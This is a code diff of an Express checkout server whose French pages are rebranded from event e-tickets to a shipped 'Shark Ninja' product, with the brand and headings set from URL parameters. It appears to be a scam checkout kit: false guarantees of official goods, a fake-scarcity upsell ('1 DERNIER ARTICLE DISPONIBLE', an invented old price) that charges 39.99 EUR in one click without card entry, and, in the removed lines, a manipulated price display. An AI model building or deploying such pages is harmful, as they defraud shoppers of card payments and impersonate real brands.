@@ -8,7 +8,7 @@ const {
   QDR_SDK_URL = "https://api.qdr6wy.im/js/checkout.js",
   PUBLIC_BASE_URL = "http://localhost:3000",
   CHECKOUT_SIGNING_SECRET = "dev-secret",
-  SHOP_NAME = "Arena Core",
+  SHOP_NAME = "Shark Ninja",
   PORT = 3000,
   MOCK_MODE = "false",
 } = process.env;
@@ -89,7 +89,7 @@ app.get("/checkout", (req, res) => {
   if (!verifySignature(req.query)) return res.status(400).send("Lien de paiement invalide ou expire.");
   const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
   const shipParam = req.query.ship ? String(req.query.ship).trim() : "";
-  const shipping = shipParam || "🎟️ E-Ticket · Livraison immédiate";
+  const shipping = shipParam || "🚚 Chronopost Express · Livraison 48h offerte";
 
   const titleParam = req.query.title ? String(req.query.title).replace(/[<>"`]/g, "").slice(0, 80) : "";
   const heading = titleParam || brand;
@@ -116,7 +116,7 @@ app.get("/upsell", (req, res) => {
   if (!transaction) return res.redirect(`/return?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
   
   const brand = sanitizeShop(shop) || SHOP_NAME;
-  const productName = transaction.productTitle || "Billet Officiel";
+  const productName = transaction.productTitle || "Produit";
 
   res.type("html").send(UPSELL_HTML
     .replace(/__SHOP_NAME__/g, brand)
@@ -182,7 +182,7 @@ app.post("/api/init", async (req, res) => {
     if (data.status !== "success" || !data.payload)
       return res.status(502).json({ status: "error", message: data.message || "init a echoue", raw: data });
     
-    let productTitle = title || "Billet";
+    let productTitle = title || "Produit";
     if (req.body.items) {
       try {
         const decodedItems = JSON.parse(decodeURIComponent(escape(atob(req.body.items))));
@@ -436,7 +436,7 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
     <div class="block-card">
       <div class="block-title-row"><div class="step-num">3</div><h2 id="lang-block3">Mode de livraison</h2></div>
       <div class="ship-box">
-        <div class="ship-box-left"><span class="ship-icon" id="lang-ship-icon">🎟️</span><div class="ship-details"><span class="ship-name" id="lang-ship-display">__SHIPPING__</span></div></div>
+        <div class="ship-box-left"><span class="ship-icon" id="lang-ship-icon">🚚</span><div class="ship-details"><span class="ship-name" id="lang-ship-display">__SHIPPING__</span></div></div>
         <span class="ship-price" id="lang-free1">Gratuit</span>
       </div>
     </div>
@@ -476,8 +476,8 @@ body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;l
 
     <div class="trust-box">
       <div class="trust-item"><span class="trust-icon" id="lang-t1-icon">🔒</span><span id="lang-t1">Paiement 100% sécurisé et chiffré</span></div>
-      <div class="trust-item"><span class="trust-icon" id="lang-t2-icon">⚡</span><span id="lang-t3">Livraison instantanée par e-mail</span></div>
-      <div class="trust-item"><span class="trust-icon" id="lang-t3-icon">🎟️</span><span id="lang-t2">Billets officiels 100% garantis</span></div>
+      <div class="trust-item"><span class="trust-icon" id="lang-t2-icon">⚡</span><span id="lang-t3">Expédition rapide et suivie</span></div>
+      <div class="trust-item"><span class="trust-icon" id="lang-t3-icon">✅</span><span id="lang-t2">Produit officiel garanti</span></div>
       <div class="trust-item"><span class="trust-icon" id="lang-t4-icon">💬</span><span id="lang-t4">Support client 7j/7</span></div>
     </div>
   </div>
@@ -500,13 +500,7 @@ var html='';
 var raw=qs.get('items');
 if(raw){try{var arr=JSON.parse(decodeURIComponent(escape(atob(raw))));arr.forEach(function(it){
 var img=it.img?('<img src="'+esc(it.img)+'" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:6px"/>'):'🛍️';
-
-var itemPrice = esc(it.price);
-if(String(it.qty) === '2' && order.amount === '119.00') {
-  itemPrice = '119.00';
-}
-
-html+='<div class="sum-item"><div class="sum-thumb">'+img+'<span class="sum-qty">'+(it.qty||1)+'</span></div><div class="sum-name-wrap"><div class="sum-name">'+esc(it.title)+'</div>'+(it.variant?'<div class="sum-variant">'+esc(it.variant)+'</div>':'')+'</div><div class="sum-price">'+itemPrice+' '+DCUR+'</div></div>';
+html+='<div class="sum-item"><div class="sum-thumb">'+img+'<span class="sum-qty">'+(it.qty||1)+'</span></div><div class="sum-name-wrap"><div class="sum-name">'+esc(it.title)+'</div>'+(it.variant?'<div class="sum-variant">'+esc(it.variant)+'</div>':'')+'</div><div class="sum-price">'+esc(it.price)+' '+DCUR+'</div></div>';
 });}catch(e){}}
 if(!html){html='<div class="sum-item"><div class="sum-thumb">🛍️<span class="sum-qty">1</span></div><div class="sum-name-wrap"><div class="sum-name">'+(qs.get('title')||'Commande __SHOP_NAME__')+'</div><div class="sum-variant">Paiement sécurisé</div></div><div class="sum-price">'+disp+'</div></div>';}
 document.getElementById('sum-items').innerHTML=html;
@@ -514,7 +508,7 @@ document.getElementById('sum-items').innerHTML=html;
 renderItems();
 
 var translations = {
-  fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Billets officiels 100% garantis", t3: "Livraison instantanée par e-mail", t4: "Support client 7j/7", shipDisplay: "E-Ticket · Livraison immédiate" }
+  fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Produit officiel garanti", t3: "Expédition rapide et suivie", t4: "Support client 7j/7", shipDisplay: "Chronopost Express" }
 };
 
 var userLang = 'fr';
@@ -550,10 +544,8 @@ if (t) {
   document.getElementById('lang-t2').textContent = t.t2;
   document.getElementById('lang-t3').textContent = t.t3;
   document.getElementById('lang-t4').textContent = t.t4;
-  
   var rawShip = qs.get('ship') || t.shipDisplay;
-  var finalCleanShip = rawShip.replace(/[🎟️🚚]/g, "").trim();
-  document.getElementById('lang-ship-display').textContent = finalCleanShip;
+  document.getElementById('lang-ship-display').textContent = rawShip.replace(/[🎟️🚚]/g, "").trim();
 }
 
 var sess=null,ready=false,cardReady=false;
@@ -629,16 +621,16 @@ body{font-family:'Inter',sans-serif;background:#f7fafc;color:#2d3748;min-height:
 
 <div class="box">
   <div class="top-lock">🔒 __SHOP_NAME__ · Système de Réservation</div>
-  <div class="alert-banner">⚠️ ALERTE STOCK : 1 DERNIER BILLET DISPONIBLE !</div>
+  <div class="alert-banner">⚠️ ALERTE STOCK : 1 DERNIER ARTICLE DISPONIBLE !</div>
   
-  <h1 class="title">Une place non attribuée détectée</h1>
-  <p class="desc">Le système a détecté qu'il reste exactement <b>UN dernier billet invendu</b> pour le quota "<b>__PRODUCT_NAME__</b>". Pour éviter qu'il ne reste vacant, l'organisateur vous le propose de manière exclusive et nominative.</p>
+  <h1 class="title">Une pièce non attribuée détectée</h1>
+  <p class="desc">Le système a détecté qu'il reste exactement <b>UN dernier article invendu</b> pour le quota "<b>__PRODUCT_NAME__</b>". Pour éviter qu'il ne reste vacant, l'organisateur vous le propose de manière exclusive.</p>
   
   <div class="product-card">
-    <div class="prod-img">🎟️</div>
+    <div class="prod-img">🎁</div>
     <div class="prod-details">
       <div class="prod-title">__PRODUCT_NAME__</div>
-      <div class="prod-sub">Dernière place disponible immédiate</div>
+      <div class="prod-sub">Dernier article disponible immédiat</div>
       <div class="price-row">
         <span class="old-price">59,99 EUR</span>
         <span class="new-price">39,99 EUR</span>
@@ -646,10 +638,10 @@ body{font-family:'Inter',sans-serif;background:#f7fafc;color:#2d3748;min-height:
     </div>
   </div>
   
-  <div class="info-box">⏱️ <b>Attention :</b> Cette offre est unique. Aucune saisie de carte bancaire n'est requise, votre commande initiale sera simplement mise à jour en 1 clic. Dès que vous quitterez cette page, ce billet sera définitivement réattribué.</div>
+  <div class="info-box">⏱️ <b>Attention :</b> Cette offre est unique. Aucune saisie de carte bancaire n'est requise, votre commande initiale sera simplement mise à jour en 1 clic. Dès que vous quitterez cette page, cet article sera définitivement réattribué.</div>
   
-  <button class="btn-claim" id="claim-btn">AJOUTER CE DERNIER BILLET (39,99€ en 1 clic)</button>
-  <a href="#" class="btn-skip" id="skip-btn">Non merci, je laisse ce billet au client suivant</a>
+  <button class="btn-claim" id="claim-btn">AJOUTER CET ARTICLE (39,99€ en 1 clic)</button>
+  <a href="#" class="btn-skip" id="skip-btn">Non merci, je laisse cet article au client suivant</a>
 </div>
 
 <script>
@@ -734,10 +726,10 @@ if(['success','approved','completed','paid'].includes(s) || ts==='success' || ts
     document.getElementById('fb-fallback').appendChild(fallbackImg);
   } catch(e){}
 
-  return done('Commande confirmée ! 🎉','Votre paiement a été validé avec succès.<br><br><b>🎟️ Vos E-Tickets viennent de vous être envoyés par e-mail.</b> Checkez vos spams si besoin !','ok',true);
+  return done('Commande confirmée ! 🎉','Votre paiement a été validé avec succès.<br><br><b>✅ Votre commande sera expédiée sous peu.</b>','ok',true);
 }
 if(['declined','failed','error','rejected'].includes(s) || ts==='declined' || ts==='failed') return done('Paiement refusé ❌','La transaction n\\'a pas abouti. Veuillez réessayer avec un autre moyen de paiement.','ko',false);
-tries++;if(tries>25)return done('Traitement en cours…','Votre paiement prend un peu de temps à être validé. Vous recevrez vos billets par e-mail dès confirmation.','pending',false);
+tries++;if(tries>25)return done('Traitement en cours…','Votre paiement prend un peu de temps à être validé. Vous recevrez une confirmation par e-mail dès validation.','pending',false);
 setTimeout(poll,2000);}).catch(function(){setTimeout(poll,2000);});}
 poll();
 })();
